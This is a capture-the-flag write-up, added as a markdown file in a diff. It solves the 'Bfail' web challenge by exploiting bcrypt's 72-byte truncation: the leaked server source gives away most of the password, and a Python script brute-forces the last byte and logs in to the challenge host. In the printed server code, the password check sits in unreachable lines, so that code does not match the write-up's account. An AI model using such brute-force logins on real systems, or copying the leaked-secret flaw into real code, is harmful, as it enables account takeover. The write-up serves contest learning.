@@ -1,0 +1,84 @@
+---
+title: "Nullcon Goa HackIM 2025 CTF Bfail"
+date: 2025-02-02T11:56:00.487Z
+draft: false
+author: dajeff
+tags: [web]
+---
+
+import css from "css/styles.css?url";
+
+<link rel="stylesheet" href={css}></link>
+
+> To 'B' secure or to 'b' fail? Strong passwords for admins are always great, right?
+>
+> Author: @gehaxelt
+>
+> http://52.59.124.14:5013
+
+The page source hints that we can view the server source code at http://52.59.124.14:5013/source.
+
+```py
+from flask import Flask, request, redirect, render_template_string
+import sys
+import os
+import bcrypt
+import urllib.parse
+
+app = Flask(__name__)
+app.secret_key = os.urandom(16)
+# This is super strong! The password was generated quite securely. Here are the first 70 bytes, since you won't be able to brute-force the rest anyway...
+# >>> strongpw = bcrypt.hashpw(os.urandom(128),bcrypt.gensalt())
+# >>> strongpw[:71]
+# b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
+app.ADMIN_PW_HASH = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
+FLAG = open("flag.txt").read();
+
+
+@app.route('/source')
+def source():
+    return open(__file__).read()
+
+
+@app.route('/', methods=["GET"])
+def index():
+    username = request.form.get("username", None)
+    password = request.form.get("password", None)
+    if username and password:
+        username = urllib.parse.unquote_to_bytes(username)
+        password = urllib.parse.unquote_to_bytes(password)
+    if username != b"admin":
+        return "Wrong user!"
+    if len(password) > 128:
+        return "Password too long!"
+        if not bcrypt.checkpw(password, app.ADMIN_PW_HASH):
+            return "Wrong password!"
+        return f"""Congrats! It appears you have successfully bf'ed the password. Here is your {FLAG}"""  # Use f-string formatting within the template string
+    # ...
+```
+
+Our goal is to find a string that hashes to `app.ADMIN_PW_HASH`.
+
+The comment gives 71 bytes of the password, despite saying it gives 70. Giving 71 bytes of the password seems strange, so we'll do some research on the `bcrypt.hashpw` format (e.g. how many bytes the salt takes up, etc) to see how much information 71 bytes really gives us.
+
+After finding the [documentation](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.bcrypt.html#security-issues), it turns out that ``only the first 72 bytes of a password are hashed,'' so we only need to brute force the last (72nd) byte of the effective password to find a string that matches the admin password hash.
+
+```py
+import bcrypt
+import requests
+
+admin = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
+salt = b'$2b$12$8bMrI6D9TMYXeMv8pq8Rje'
+for b in range(256):
+    password = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76' + b.to_bytes()
+    h = bcrypt.hashpw(password, salt)
+    if h == admin:
+        break
+
+# password = b"\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9<\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc@\xa9\xa1@\x9c\xeee\xe0\xe0\xf76\xaa"
+
+session = requests.Session()
+print(session.get("http://52.59.124.14:5013", data={"username": "admin", "password": password}).text)
+```
+
+Flag: `ENO{BCRYPT_FAILS_TO_B_COOL_IF_THE_PW_IS_TOO_LONG}`
